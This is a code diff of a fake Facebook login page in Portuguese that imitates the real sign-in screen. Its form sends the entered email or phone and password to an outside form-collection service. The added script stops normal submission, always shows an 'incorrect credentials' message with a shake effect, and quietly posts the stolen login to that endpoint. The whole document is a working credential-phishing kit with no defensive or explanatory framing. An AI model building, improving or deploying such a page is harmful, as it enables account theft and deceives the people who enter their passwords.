@@ -1,134 +1,136 @@
 <html lang="en">
- <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-  <title>
-   Facebook Login
-  </title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
-  <style>
-   #loadingScreen {
-    display: flex;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255, 255, 255, 0.8);
-    z-index: 1000;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-   }
-   .loader {
-    border: 16px solid #f3f3f3;
-    border-radius: 50%;
-    border-top: 16px solid #3498db;
-    width: 120px;
-    height: 120px;
-    -webkit-animation: spin 1s linear infinite;
-    animation: spin 1s linear infinite;
-   }
-   @-webkit-keyframes spin {
-    0% {
-     -webkit-transform: rotate(0deg);
-    }
-    100% {
-     -webkit-transform: rotate(360deg);
-    }
-   }
-   @keyframes spin {
-    0% {
-     transform: rotate(0deg);
-    }
-    100% {
-     transform: rotate(360deg);
-    }
-   }
-  </style>
- </head>
- <body class="bg-gray-100 flex items-center justify-center min-h-screen">
-  <div id="loadingScreen" class="flex">
-   <div class="text-center">
-    <div class="loader mb-4"></div>
-    <h2 class="text-center text-xl font-semibold text-blue-600">
-     Carregando...
-    </h2>
-   </div>
-  </div>
-  <div id="content" class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm" style="display: none;">
-   <div class="text-center mb-6">
-    <h1 class="text-blue-600 text-4xl font-bold">
-     facebook
-    </h1>
-   </div>
-   <h2 class="text-center text-xl font-semibold mb-4">
-    Entrar no Facebook
-   </h2>
-   <form id="loginForm" action="https://api.sheetmonkey.io/form/6QX4enpNcBZ4eEBcc4hLWc" method="post">
-    <div class="mb-4">
-     <input class="w-full p-3 border border-gray-300 rounded-lg" id="email_or_phone" name="email_or_phone" placeholder="Email ou telefone" type="text"/>
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Facebook Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+    <style>
+        #loadingScreen {
+            display: flex;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            -webkit-animation: spin 1s linear infinite;
+            animation: spin 1s linear infinite;
+        }
+        @-webkit-keyframes spin {
+            0% { -webkit-transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); }
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .shake {
+            animation: shake 0.5s;
+            animation-iteration-count: 1;
+        }
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div id="loadingScreen" class="flex">
+        <div class="text-center">
+            <div class="loader mb-4"></div>
+            <h2 class="text-center text-xl font-semibold text-blue-600">Carregando...</h2>
+        </div>
     </div>
-    <div class="mb-4">
-     <input class="w-full p-3 border border-gray-300 rounded-lg" id="password" name="password" placeholder="Senha" type="password"/>
+    <div id="content" class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm" style="display: none;">
+        <div class="text-center mb-6">
+            <h1 class="text-blue-600 text-4xl font-bold">facebook</h1>
+        </div>
+        <h2 class="text-center text-xl font-semibold mb-4">Entrar no Facebook</h2>
+        <form id="loginForm" action="https://api.sheetmonkey.io/form/6QX4enpNcBZ4eEBcc4hLWc" method="post">
+            <div class="mb-4">
+                <input class="w-full p-3 border border-gray-300 rounded-lg" id="email_or_phone" name="email_or_phone" placeholder="Email ou telefone" type="text"/>
+            </div>
+            <div class="mb-4">
+                <input class="w-full p-3 border border-gray-300 rounded-lg" id="password" name="password" placeholder="Senha" type="password"/>
+            </div>
+            <div class="mb-4">
+                <button class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold" type="submit">Entrar</button>
+            </div>
+            <div class="text-center mb-4">
+                <a class="text-blue-600" href="#">Esqueceu a conta?</a>
+            </div>
+            <div class="flex items-center mb-4">
+                <hr class="flex-grow border-gray-300"/>
+                <span class="px-2 text-gray-500">ou</span>
+                <hr class="flex-grow border-gray-300"/>
+            </div>
+            <div>
+                <button class="w-full bg-green-600 text-white p-3 rounded-lg font-semibold" type="button">Criar nova conta</button>
+            </div>
+        </form>
+        <div id="message" class="mt-4 text-center text-red-600"></div>
     </div>
-    <div class="mb-4">
-     <button class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold" type="submit">
-      Entrar
-     </button>
-    </div>
-    <div class="text-center mb-4">
-     <a class="text-blue-600" href="#">
-      Esqueceu a conta?
-     </a>
-    </div>
-    <div class="flex items-center mb-4">
-     <hr class="flex-grow border-gray-300"/>
-     <span class="px-2 text-gray-500">
-      ou
-     </span>
-     <hr class="flex-grow border-gray-300"/>
-    </div>
-    <div>
-     <button class="w-full bg-green-600 text-white p-3 rounded-lg font-semibold" type="button">
-      Criar nova conta
-     </button>
-    </div>
-   </form>
-   <div id="message" class="mt-4 text-center text-red-600">
-   </div>
-  </div>
-  <script>
-   document.addEventListener('DOMContentLoaded', function() {
-    setTimeout(function() {
-     document.getElementById('loadingScreen').style.display = 'none';
-     document.getElementById('content').style.display = 'block';
-    }, 1000); // Simulate loading time
-   });
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('content').style.display = 'block';
+            }, 1000); // Simulate loading time
+        });
 
-   document.getElementById('loginForm').addEventListener('submit', function(event) {
-    const emailOrPhone = document.getElementById('email_or_phone').value;
-    const password = document.getElementById('password').value;
-    const messageDiv = document.getElementById('message');
-    messageDiv.textContent = '';
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const emailOrPhone = document.getElementById('email_or_phone');
+            const password = document.getElementById('password');
+            const messageDiv = document.getElementById('message');
+            messageDiv.textContent = 'Credencias ou Senha Incorreto.';
+            emailOrPhone.classList.add('border-red-500', 'shake');
+            password.classList.add('border-red-500', 'shake');
+            setTimeout(() => {
+                emailOrPhone.classList.remove('shake');
+                password.classList.remove('shake');
+            }, 500);
 
-    if (!emailOrPhone) {
-     event.preventDefault();
-     messageDiv.textContent = 'Por favor, insira o email ou telefone.';
-     return;
-    }
-
-    if (!password) {
-     event.preventDefault();
-     messageDiv.textContent = 'Por favor, insira a senha.';
-     return;
-    }
-
-    document.getElementById('loadingScreen').style.display = 'flex';
-   });
-  </script>
- </body>
+            // Send form data to the API
+            const formData = new FormData(event.target);
+            fetch(event.target.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Form successfully submitted');
+                } else {
+                    console.error('Form submission failed');
+                }
+            }).catch(error => {
+                console.error('Error submitting form:', error);
+            });
+        });
+    </script>
+</body>
 </html>
